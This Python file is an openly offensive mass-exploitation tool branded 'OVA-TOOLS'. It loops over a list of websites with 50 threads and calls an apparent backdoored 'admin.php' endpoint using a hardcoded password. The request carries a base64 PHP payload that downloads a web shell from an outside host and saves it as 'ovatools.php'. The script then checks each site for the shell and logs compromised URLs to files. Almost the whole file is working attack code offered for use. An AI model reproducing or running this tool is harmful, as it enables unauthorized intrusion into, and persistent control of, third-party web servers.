import os
import sys
import requests
import string
import random
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import Fore
import re

requests.urllib3.disable_warnings()

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

fr = Fore.RED
fg = Fore.GREEN

banner = '''{}
           
[#] Create By ::

   ______      __       _______ ____   ____  _       _____ 
  / __ \ \    / /\     |__   __/ __ \ / __ \| |     / ____|
 | |  | \ \  / /  \ ______| | | |  | | |  | | |    | (___  
 | |  | |\ \/ / /\ \______| | | |  | | |  | | |     \___ \ 
 | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
  \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/ 
                          OVA-TOOLS  https://t.me/ovacloud  
                                 File Upload general                         
                                                 

\n'''.format(fr)

requests.urllib3.disable_warnings()

if len(sys.argv) <= 1:
    exit('usage: {} <myuploaders.txt> '.format(os.path.basename(sys.argv[0])))

fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW
fb = Fore.BLUE

try:
    uploaders = [i.strip() for i in open(sys.argv[1], 'r').readlines()]
except IOError:
    exit('{} File does not exist'.format(sys.argv[1]))

#select = sys.argv[2]

#f not select:
    #exit("\n  [!] No shell file selected.")


def content_fox(req):
    if sys.version_info[0] < 2:
        try:
            return str(req.content)
        except:
            try:
                return str(req.content.encode('utf-8'))
            except:
                return str(req.content.decode('utf-8'))
    else:
        try:
            return str(req.content.decode('utf-8'))
        except:
            try:
                return str(req.content.encode('utf-8'))
            except:
                return str(req.text)


def url_domain(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    return site


def generate_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))


def read_file(filename):
    with open(filename, 'rb') as file:
        return file.read()


def post1(url, index):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'
        }

        filename = 'ova' + generate_random_string(6) + ".php"
        #filenames = 'ova' + generate_random_string(6) + ".php"
        #content_files = read_file(select)
        content_filess = """PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ292YXRvb2xzLnBocCcsIGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwczovL3VjZG8uZ3JvdXAvd3AtYWRtaW4vdS50eHQnKSkgPyBwcmludCAnc3VjY2Vzc2Z1bGx5ICcgOiBwcmludCAnRXJyb3InOyA/Pg=="""
        check_url = f'{url}/admin.php?action=beindex&password=sem2023&aver={content_filess}&fileplus={content_filess}&checkstring={content_filess}'
        check = requests.get(check_url, verify=False, headers=headers)
        
        s1 = url + '/' + '/aver.php'
        shell1 = requests.get(s1, verify=False, headers=headers)
        #print(shell1.text)
        s = url + '/' + '/ovatools.php'
        shell = requests.get(s, verify=False, headers=headers)
        if 'Ova-Tools' in shell.text:
            sys.stdout.write(s + ' --------> deliver !!\n\a')
            with open(f'up_{index}.txt', 'a') as ww:
                ww.write(s + '\n')
        else:
            print(url + ' ----> failed.')
            with open(f'failed_{index}.txt', 'a') as ww:
                ww.write(url + '\n')

    except Exception as e:
        print(e)


for i in range(1, 2):
    print(f"Running request {i}")
    pool = Pool(50)
    pool.starmap(post1, [(url, i) for url in uploaders])
    pool.close()
    pool.join()
